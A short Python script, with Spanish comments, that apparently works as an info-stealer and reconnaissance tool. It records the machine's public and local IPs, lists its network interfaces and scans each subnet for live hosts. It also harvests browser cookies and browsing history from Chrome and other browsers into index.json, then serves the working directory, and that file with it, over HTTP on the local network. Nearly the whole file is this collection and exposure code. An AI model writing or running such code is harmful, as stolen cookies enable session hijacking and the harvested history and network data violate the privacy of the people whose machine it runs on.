import re
from http.server import HTTPServer, SimpleHTTPRequestHandler

from browsers import getBrowsersInfo
import net
PORT = 8000



def main():
    publicIP= net.getPublicIP()
    localIP = net.getLocalIP()
    browsers = getBrowsersInfo()
    httpd = HTTPServer((f"{localIP}", int(8000)), SimpleHTTPRequestHandler)
    
    with open("index.json", 'w') as archivo:
        
        # ------------------------------------
        # ----------   NETWORK  --------------
        # ------------------------------------
        
        archivo.write('{\n\t"Network":{')
        archivo.write("\n\t\t"+f"\"Public IP\": \"{publicIP}\",\n\t\t\"Local IP\": \"{localIP}\",\n\n\t\t\"Interfaces\":{{\n\t\t\t")
        index = False
        
        for interface, value in net.getInterfacesInfo().items():
            if index== False:
                archivo.write(f'"{interface}":{{\n\t\t\t\t"Network Data":{{ "gateway":"{value[0]}", "submask": "{value[1]}" }},\n\t\t\t\t"Hosts in Network": {{  }}}}')
                index = True
            else:
                archivo.write(f',\n\t\t\t"{interface}":{{\n\t\t\t\t"Network Data":{{ "gateway":"{value[0]}", "submask": "{value[1]}" }},\n\t\t\t\t"Hosts in Network": {{  }}}}')         
    
            try:
                #Ingresa como argumentos la IP y la máscara de la red en la interfaz
                hosts_up = net.hostDiscovery(f"{".".join(value[0].split(".")[:-1])+"."+str(int(value[0].split(".")[3])-1)  +"/"+  str(sum(bin(int(x)).count('1') for x in value[1].split('.'))) }")
                print(f"Hosts en línea en la interfaz {interface}:")
                for ip in hosts_up:
                    print(ip)
            except:
                pass
            
        archivo.write('\n\t\t}\n\t},')
            
            
            
        # ------------------------------------
        # ----------   BROWSER  --------------
        # ------------------------------------
            
        archivo.write('\n\t\"Browsers\":{\n\t\t')




        
        for browser in browsers:
            if browser == "Chrome":
                if browsers[browser][0] == None:
                    browsers[browser][0] = "None"

                archivo.write(f'"{browser}\": {{\n\t\t\t"Cookies\":{browsers[browser][0]},\n\t\t\t"History":{{\n')
            else:
                if browsers[browser][0] == None:
                    browsers[browser][0] = '"None"'

                archivo.write('},\n\t\t"'+browser+f'": {{\n\t\t\t"Cookies":{browsers[browser][0]},\n\t\t\t"History":{{\n' )
            index = 0
            for history in browsers[browser][1]:
                if index == 0:
                    archivo.write( f'\t\t\t\t"Entry{index}": {{"{history["datetime"]}": "{history["url"]}"}}' )

                else:
                    archivo.write( f',\n\t\t\t\t"Entry{index}": {{"{history["datetime"]}": "{history["url"]}"}}' )
                index+=1
            archivo.write("\n\t\t\t}\n\t\t")
        archivo.write("}\n\t}\n}")



    print("\nServing HTTP on localhost port " + str(8000) + f" (http://{localIP}:" + str(8000) + "/) ...")
    httpd.serve_forever()

        
if __name__ == "__main__":
    main()    
